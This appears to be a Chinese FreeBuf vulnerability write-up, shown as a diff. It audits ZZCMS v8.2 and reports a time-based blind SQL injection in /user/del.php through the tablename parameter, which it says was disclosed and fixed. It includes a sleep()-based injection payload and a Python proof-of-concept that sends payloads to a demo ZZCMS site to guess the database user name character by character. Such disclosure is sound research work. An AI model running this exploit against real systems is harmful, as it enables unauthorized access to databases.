@@ -1,0 +1,19 @@
+*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
+*本文原创作者：vr_system，本文属FreeBuf原创奖励计划，未经许可禁止转载
+0x00概述
+近期一直在致力于审计CMS的漏洞，当审计遇到ZZCMS v8.2，发现SQL注入漏洞。
+0x01 白盒审计
+通过白盒审计工具，发现 /user/del.php 存在SQL注入漏洞。
+代码位置： /user/del.php 12行，获取参数。
+由于存在checkid() 导致 $id无法进行注入，checkid() 代码如图。
+代码位置：/inc/function.php 49行
+在switch() 分支中不存在SQL注入就不展示代码了。在后面代码中 135行 发现存在SQL注入问题。
+$tablename 可控，可以进行SQL注入。由于$tablename 所在位置无需闭合引号和CMS过滤大于号和小于号（转换为实体），拼接为 select id,editor, from zzcms_answer where id = 1 and if((ascii(substr(user(),1,1)) =121),sleep(5),1)#where id in 1; 拼接成如此的SQL语句可以完成注入。
+0x02 漏洞利用
+测试payload:id=1&tablename=zzcms_answer where id = 1 and if((ascii(substr(user(),1,1)) =121),sleep(5),1)%23
+测试结果如图。
+0x03POC
+用python完成POC进行批量漏洞利用，猜测用户名的第一个字符。
+#!/usr/bin/env python # -*- coding: utf-8 -*- import requests import time payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.' #匹配用的字符串 url = "http://demo.zzcms.net/user/del.php" user = '' for i in range(1, 2): for payload in payloads: #遍历取出字符 startTime = time.time() post_data = "id=1&tablename=zzcms_answer where id = 1 and if((ascii(substr(user(),1,1))=" + str(ord(payload)) + "),sleep(5),1)%23".encode("utf-8") response = requests.post(url, timeout=6, data=post_data, headers={"Content-Type": "application/x-www-form-urlencoded"} ) if time.time() - startTime > 5: user = payload print 'user is:', user break print '
+[Done] current user is %s' % user
+*本文原创作者：vr_system，本文属FreeBuf原创奖励计划，未经许可禁止转载
